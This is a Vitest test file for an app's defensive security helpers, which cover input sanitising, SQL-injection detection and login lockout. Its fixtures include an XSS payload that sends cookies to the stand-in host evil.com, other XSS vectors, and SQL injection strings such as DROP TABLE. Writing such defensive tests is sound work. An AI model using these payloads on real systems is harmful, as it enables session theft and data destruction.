import { describe, it, expect, beforeEach } from 'vitest';
import { 
  sanitizeInput, 
  containsSqlInjection, 
  getLockoutStatus, 
  recordFailedAttempt, 
  resetFailedAttempts 
} from '../lib/security';

describe('Auth Security Logic Tests - Bot & Brute Force Protection', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('sanitizeInput', () => {
    it('should sanitize HTML script tags, event handlers, and javascript URLs', () => {
      const maliciousScript = '<script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>';
      const sanitizedScript = sanitizeInput(maliciousScript);
      expect(sanitizedScript).not.toContain('<script>');
      expect(sanitizedScript).not.toContain('fetch');

      const maliciousXSS = '<img src="x" onerror="alert(1)">';
      const sanitizedXSS = sanitizeInput(maliciousXSS);
      expect(sanitizedXSS).not.toContain('onerror=');

      const maliciousHref = '<a href="javascript:alert(1)">Click</a>';
      const sanitizedHref = sanitizeInput(maliciousHref);
      expect(sanitizedHref).not.toContain('javascript:');
    });

    it('should preserve safe text content', () => {
      const safeText = '   Mata Pelajaran Matematika Kelas 7A   ';
      expect(sanitizeInput(safeText)).toBe('Mata Pelajaran Matematika Kelas 7A');
    });

    it('should return empty string for null or empty input', () => {
      expect(sanitizeInput('')).toBe('');
    });
  });

  describe('containsSqlInjection', () => {
    it('should detect SQL Injection attack patterns from automated bots', () => {
      expect(containsSqlInjection("admin' OR '1'='1")).toBe(true);
      expect(containsSqlInjection("1' AND '1'='1")).toBe(true);
      expect(containsSqlInjection("UNION SELECT 1,2,3 FROM users")).toBe(true);
      expect(containsSqlInjection("DROP TABLE students;--")).toBe(true);
      expect(containsSqlInjection("INSERT INTO users VALUES ('hacker')")).toBe(true);
      expect(containsSqlInjection("DELETE FROM attendance WHERE 1=1")).toBe(true);
    });

    it('should return false for valid input strings', () => {
      expect(containsSqlInjection("Budi Santoso")).toBe(false);
      expect(containsSqlInjection("SMP Negeri 1 Jakarta")).toBe(false);
      expect(containsSqlInjection("Nilai Ujian Akhir Semester")).toBe(false);
    });
  });

  describe('getLockoutStatus & Brute Force Lockout Calculation', () => {
    it('should return default unlocked state when no failed attempts recorded', () => {
      const status = getLockoutStatus();
      expect(status.isLocked).toBe(false);
      expect(status.attemptsCount).toBe(0);
      expect(status.remainingSeconds).toBe(0);
    });

    it('should track failed login attempts and lock out account after 5 threshold attempts', () => {
      recordFailedAttempt();
      recordFailedAttempt();
      recordFailedAttempt();
      recordFailedAttempt();

      let status = getLockoutStatus();
      expect(status.isLocked).toBe(false);
      expect(status.attemptsCount).toBe(4);

      // 5th attempt triggers lockout
      const statusAfter5th = recordFailedAttempt();
      expect(statusAfter5th.isLocked).toBe(true);
      expect(statusAfter5th.attemptsCount).toBe(5);
      expect(statusAfter5th.remainingSeconds).toBeGreaterThan(0);
    });

    it('should reset failed attempts on successful reset call', () => {
      recordFailedAttempt();
      recordFailedAttempt();

      resetFailedAttempts();

      const status = getLockoutStatus();
      expect(status.isLocked).toBe(false);
      expect(status.attemptsCount).toBe(0);
    });
  });
});
